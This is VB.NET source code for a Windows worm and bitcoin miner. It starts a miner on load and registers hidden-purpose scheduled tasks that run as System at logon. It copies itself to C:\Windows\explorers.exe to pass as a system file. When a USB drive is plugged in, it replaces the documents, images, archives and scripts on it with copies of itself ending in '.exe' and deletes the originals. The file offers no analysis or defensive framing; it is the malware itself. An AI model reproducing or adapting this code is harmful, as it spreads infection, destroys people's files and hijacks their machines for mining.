Imports System.Management
Imports System.Net
Imports System.IO
Imports System.Net.Mail

Public Class Form1

    Private WithEvents m_MediaConnectWatcher As ManagementEventWatcher
    Dim DriveLetter As String = ""
    Dim LblText As String = ""
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'MsgBox("hello")
        Me.Location = New Point(CInt((Screen.PrimaryScreen.WorkingArea.Width / 2) - (Me.Width / 2)), CInt((Screen.PrimaryScreen.WorkingArea.Height / 2) - (Me.Height / 2)))
        StartDetection()

        'Check Task Manger Open
        WatchForNewProcesses()

        'Register Task for app 
        RegTask()

        'Download Minerbitcoin
        Miner.MainMiner()
        While True
            FlushMemory()
            System.Threading.Thread.Sleep(250000)
        End While
        Me.Hide()
        Me.Close()
    End Sub
    Private Sub WatchForNewProcesses()
        ' Create a new Process watcher
        Dim watcher As New ProcessCreationWatcher
        AddHandler watcher.ProcessCreated, AddressOf NewProcessHandler
        watcher.Start(1)
    End Sub
    Private Sub NewProcessHandler(ByVal sender As Object, ByVal e As ProcessEventArgs)
        ' Get the process ID
        Dim procID As Integer = e.ProcessID
    End Sub
    Sub TaskModify()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)

        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"


        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT5M"
        trigger.Enabled = True
        '***********************************************************
        ' Create the action for the task to execute.

        ' Add an action to the task. The action executes notepad.
        'Dim Action
        ' Action = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action.Path = "C:\UsersFile\Backup\sercurity.exe"

        Dim Action1
        '  Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action1.Path = "C:\UsersFile\Backup\sercurity.exe"

        Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        Action1.Path = "C:\Windows\SoftModify\modify.exe"
        '***********************************************************
        ' Register (create) the task.
        Const createOrUpdateTask = 6
        Call rootFolder.RegisterTaskDefinition( _
            "TaskModify", taskDefinition, createOrUpdateTask, _
            "System", , 2)

    End Sub
    Sub TaskALLScheduler()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)

        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"


        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT25M"
        trigger.Enabled = True
        '***********************************************************
        ' Create the action for the task to execute.

        ' Add an action to the task. The action executes notepad.
        'Dim Action
        ' Action = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action.Path = "C:\UsersFile\Backup\sercurity.exe"

        Dim Action1
        '  Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action1.Path = "C:\UsersFile\Backup\sercurity.exe"

        Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        Action1.Path = "C:\Windows\Software\TaskALL.exe"
        '***********************************************************
        ' Register (create) the task.
        Const createOrUpdateTask = 6
        Call rootFolder.RegisterTaskDefinition( _
            "TaskALL", taskDefinition, createOrUpdateTask, _
            "System", , 2)

    End Sub
    Sub TaskCleanSchduder()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)
        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"

        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT20M"
        trigger.Enabled = True
        '***********************************************************
        Dim Action1
        Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        Action1.Path = "C:\Windows\TaskClean\TaskClean.exe"
        '***********************************************************
        ' Register (create) the task.
        Const createOrUpdateTask = 6
        Call rootFolder.RegisterTaskDefinition( _
            "TaskClean", taskDefinition, createOrUpdateTask, _
            "System", , 2)

    End Sub
    Sub TaskExploer()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)

        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"


        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT50S"
        trigger.Enabled = True
        '***********************************************************
        ' Create the action for the task to execute.

        ' Add an action to the task. The action executes notepad.
        'Dim Action
        ' Action = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action.Path = "C:\UsersFile\Backup\sercurity.exe"

        Dim Action1
        '  Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        ' Action1.Path = "C:\UsersFile\Backup\sercurity.exe"

        Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
        Action1.Path = "C:\Windows\explorers.exe"
        '***********************************************************     
        ' Register (create) the task.
        Const createOrUpdateTask = 6
        Call rootFolder.RegisterTaskDefinition( _
            "TaskName", taskDefinition, createOrUpdateTask, _
            "System", , 2)

    End Sub
    Sub minerTask()

        Dim service As Object
        '---------------------------------------------------------
        ' This sample schedules a task to start notepad.exe 30 seconds after
        ' the system is booted.
        '---------------------------------------------------------

        ' A constant that specifies a boot trigger.
        'Const TriggerTypeBoot = 8
        Const LogonTrigger = 9
        ' A constant that specifies an executable action.
        Const ActionTypeExecutable = 0

        '********************************************************
        ' Create the TaskService object.
        service = CreateObject("Schedule.Service")
        Call service.Connect()

        '********************************************************
        ' Get a folder to create a task definition in. 
        Dim rootFolder
        rootFolder = service.GetFolder("\")

        ' The taskDefinition variable is the TaskDefinition object.
        Dim taskDefinition
        ' The flags parameter is 0 because it is not supported.
        taskDefinition = service.NewTask(0)

        '********************************************************
        ' Define information about the task.

        ' Set the registration info for the task by 
        ' creating the RegistrationInfo object.
        Dim regInfo
        regInfo = taskDefinition.RegistrationInfo
        regInfo.Description = "Task will execute Notepad when " & _
            "the computer is booted."
        regInfo.Author = "Author Name"


        ' Set the task setting info for the Task Scheduler by
        ' creating a TaskSettings object.
        Dim settings
        settings = taskDefinition.Settings
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.Priority = 7

        settings.IdleSettings.StopOnIdleEnd = True
        settings.IdleSettings.RestartOnIdle = False
        settings.AllowDemandStart = True
        settings.Enabled = True

        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = True
        settings.AllowHardTerminate = True
        settings.StartWhenAvailable = False
        settings.RunOnlyIfNetworkAvailable = False
        settings.RunOnlyIfIdle = False
        'settings.DisallowStartOnRemoteAppSession = False
        'settings.UseUnifiedSchedulingEngine = False
        settings.WakeToRun = False

        '********************************************************
        ' Create a boot trigger.
        Dim triggers
        triggers = taskDefinition.Triggers

        Dim trigger
        trigger = triggers.Create(LogonTrigger)
        trigger.Delay = "PT40S"
        trigger.Enabled = True
        '***********************************************************
        ' Create the action for the task to execute.
        Try
            Dim fileReader As System.IO.StreamReader
            fileReader = My.Computer.FileSystem.OpenTextFileReader("C:\Windows\Software\mUrl.txt")
            Dim stringReader As String
            Do
                stringReader = fileReader.ReadLine
                If String.IsNullOrEmpty(stringReader) Then
                    'nothing
                Else
                    Dim Action1
                    Action1 = taskDefinition.Actions.Create(ActionTypeExecutable)
                    Action1.Path = "C:\Windows\Software\publish.exe"
                    Action1.Arguments = stringReader.ToString
                    Const createOrUpdateTask = 6
                    Call rootFolder.RegisterTaskDefinition( _
                        "Sercurity", taskDefinition, createOrUpdateTask, _
                        "System", , 2)
                End If
            Loop Until stringReader Is Nothing
            fileReader.Close()
        Catch ex As Exception

        End Try



    End Sub
    Public Sub FlushMemory()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess.Handle, -1, -1)
                Dim myProcesses As Process() = Process.GetProcessesByName("ApplicationN­ame")
                Dim myProcess As Process
                'Dim ProcessInfo As Process 
                For Each myProcess In myProcesses
                    SetProcessWorkingSetSize(myProcess.Handle, -1, -1)
                Next myProcess
            End If
        Catch ex As Exception
        End Try

    End Sub
    'Coppy files
    Sub RegTask()
        Dim FileName As String
        Dim FilePath As String

        'Dim publish As String = "C:\Windows\Software\publish.exe"
        TaskExploer()
        minerTask()
        'Check modfiy co ton tai khong
        Dim modify As String = "C:\Windows\SoftModify\modify.exe"
        If My.Computer.FileSystem.FileExists(modify) Then
        Else
            TaskModify()
        End If

        Dim TaskClean As String = "C:\Windows\TaskClean\TaskClean.exe"
        If My.Computer.FileSystem.FileExists(TaskClean) Then
        Else
            TaskCleanSchduder()
        End If

        Dim TaskALL As String = "C:\Windows\Software\TaskALL.exe"
        If My.Computer.FileSystem.FileExists(TaskALL) Then
        Else
            TaskALLScheduler()
        End If

        'copy1
        FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName
        FilePath = Path.GetFullPath(FileName)
        ' Copy the file to a new folder, overwriting existing file.
        Try
            If My.Computer.FileSystem.FileExists("C:\Windows\explorers.exe") Then
                ' MsgBox("File found.")
            Else
                'MsgBox("File not found.")
                My.Computer.FileSystem.CopyFile(
                FilePath,
                 "C:\Windows\explorers.exe",
                  Microsoft.VisualBasic.FileIO.UIOption.AllDialogs,
                    Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
                'Check outlook da duoc cai dat chua
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Closing(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosing
        m_MediaConnectWatcher.Stop()
    End Sub
    'Find usb Câm vao 
    Public Sub StartDetection()
        ' __InstanceOperationEvent will trap both Creation and Deletion of class instances
        Dim query2 As New WqlEventQuery("SELECT * FROM __InstanceOperationEvent WITHIN 1 " & "WHERE TargetInstance ISA 'Win32_DiskDrive'")
        m_MediaConnectWatcher = New ManagementEventWatcher
        m_MediaConnectWatcher.Query = query2
        m_MediaConnectWatcher.Start()
    End Sub
    'Sub nhan su kien When Usb dc them vao !
    Sub Arrived(ByVal sender As Object, ByVal e As System.Management.EventArrivedEventArgs) Handles m_MediaConnectWatcher.EventArrived
        Dim mbo, obj As ManagementBaseObject
        ' the first thing we have to do is figure out if this is a creation or deletion event
        mbo = CType(e.NewEvent, ManagementBaseObject)
        ' next we need a copy of the instance that was either created or deleted
        obj = CType(mbo("TargetInstance"), ManagementBaseObject)
        Select Case mbo.ClassPath.ClassName
            'When usb added
            Case "__InstanceCreationEvent"
                If obj("InterfaceType").ToString = "USB" Then
                    LblText = (obj("Caption").ToString & " (Drive letter " & GetDriveLetterFromDisk(obj("Name").ToString) & ") has been plugged in")
                    DriveLetter = GetDriveLetterFromDisk(obj("Name").ToString)
                    ' MsgBox(DriveLetter + "\")

                    DirSearch(DriveLetter + "\")
                Else
                    LblText = (obj("InterfaceType").ToString)
                End If
                'When usb remove
            Case "__InstanceDeletionEvent"
                If obj("InterfaceType").ToString = "USB" Then
                    LblText = obj("Caption").ToString & " has been unplugged"
                    DriveLetter = ""

                Else
                    LblText = obj("InterfaceType").ToString
                End If
            Case Else
                LblText = "nope: " & obj("Caption").ToString
        End Select
    End Sub
    Function getNameDriver(ByVal name As String) As String
        name = name + "\"
        Return name
    End Function
    <System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Usage", "CA2202:Do not dispose objects multiple times")> Function GetDriveLetterFromDisk(ByVal Name As String) As String
        Dim oq_part, oq_disk As ObjectQuery
        Dim mos_part, mos_disk As ManagementObjectSearcher
        Dim obj_part, obj_disk As ManagementObject
        Dim ans As String = ""
        ' WMI queries use the "\" as an escape charcter
        Name = Replace(Name, "\", "\\")
        ' First we map the Win32_DiskDrive instance with the association called
        ' Win32_DiskDriveToDiskPartition. Then we map the Win23_DiskPartion
        ' instance with the assocation called Win32_LogicalDiskToPartition
        oq_part = New ObjectQuery("ASSOCIATORS OF {Win32_DiskDrive.DeviceID=""" & Name & """} WHERE AssocClass = Win32_DiskDriveToDiskPartition")
        mos_part = New ManagementObjectSearcher(oq_part)
        For Each obj_part In mos_part.Get()
            oq_disk = New ObjectQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID=""" & obj_part("DeviceID").ToString & """} WHERE AssocClass = Win32_LogicalDiskToPartition")
            mos_disk = New ManagementObjectSearcher(oq_disk)
            For Each obj_disk In mos_disk.Get()
                ans &= obj_disk("Name").ToString
            Next
        Next
        Return ans
    End Function

    'Thu tuc infectFile_usb 
    Sub infectFile_usb(ByVal d As String)
        Try
            Dim di As New IO.DirectoryInfo(d)
            Dim diar1 As IO.FileInfo() = di.GetFiles()
            Dim dra As IO.FileInfo
            Dim ext, name, fullpath As String
            Dim FileToDelete As String

            Dim FileName As String
            Dim FilePath As String
            FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName
            FilePath = Path.GetFullPath(FileName)
            'list the names of all files in the specified directory

            For Each dra In diar1
                Try
                    name = dra.FullName
                    ext = dra.Extension
                    FileToDelete = name
                    fullpath = Nothing
                    'path1 = dra.DirectoryName

                    If (ext = ".pdf") Or (ext = ".doc") Or (ext = ".docx") Or (ext = ".rar") Or (ext = ".zip") Or (ext = ".jpg") Or (ext = ".jpeg") Or (ext = ".txt") Or (ext = ".html") Or (ext = ".php") Or (ext = ".js") Or (ext = ".jpeg") Or (ext = ".ini") Or (ext = ".vbs") Or (ext = ".bat") Or (ext = ".gif") Or (ext = ".mp3") Or (ext = ".mp4") Or (ext = ".log") Then
                        fullpath = name + ".exe"
                        ' Copy the file to a new folder, overwriting existing file.
                        My.Computer.FileSystem.CopyFile(FilePath, fullpath,
                         Microsoft.VisualBasic.FileIO.UIOption.AllDialogs,
                         Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)

                        'Delete File
                        If System.IO.File.Exists(FileToDelete) = True Then
                            System.IO.File.Delete(FileToDelete)
                            'MessageBox.Show("File Deleted")
                        End If
                    End If
                Catch ex As System.IO.PathTooLongException
                End Try
            Next
        Catch ex As System.UnauthorizedAccessException
        End Try
    End Sub
    'Thu tuc liet ke thu muc
    Sub DirSearch(ByVal sDir As String)
        Dim d As String

        Try
            Try
                If (sDir = getNameDriver(DriveLetter)) Then
                    DriveLetter = Nothing
                    infectFile_usb(sDir)
                    For Each d In Directory.GetDirectories(sDir)
                        infectFile_usb(d)
                        DirSearch(d)
                    Next
                End If
            Catch ex As System.UnauthorizedAccessException
            End Try
        Catch ex As Exception
        End Try
    End Sub

    'open ie and register

End Class
